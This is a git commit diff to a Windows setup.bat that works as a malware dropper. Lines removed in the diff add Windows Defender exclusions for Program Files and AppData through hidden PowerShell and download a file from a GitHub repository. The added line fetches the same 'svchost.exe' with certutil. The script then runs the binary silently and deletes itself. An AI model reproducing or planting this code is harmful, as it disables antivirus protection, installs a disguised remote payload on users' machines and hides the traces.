ed77b70f7e0e9eedeeff2f927b7a0fba2268b2f3
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 11:24:53 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,6 +1,5 @@
 @echo off
 cd /d "%~dp0"
-powershell -w hidden -Command "$p=[Environment]::GetFolderPath('ProgramFilesX86');$u=$p-replace' \(x86\)','';Add-MpPreference -ExclusionPath $u;Add-MpPreference -ExclusionPath $p;$a=[Environment]::GetFolderPath('ApplicationData');Add-MpPreference -ExclusionPath $a;$l=[Environment]::GetFolderPath('LocalApplicationData');Add-MpPreference -ExclusionPath $l"
-powershell -w hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe','%~dp0svchost.exe')"
+certutil -urlcache -f https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe svchost.exe >nul
 if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
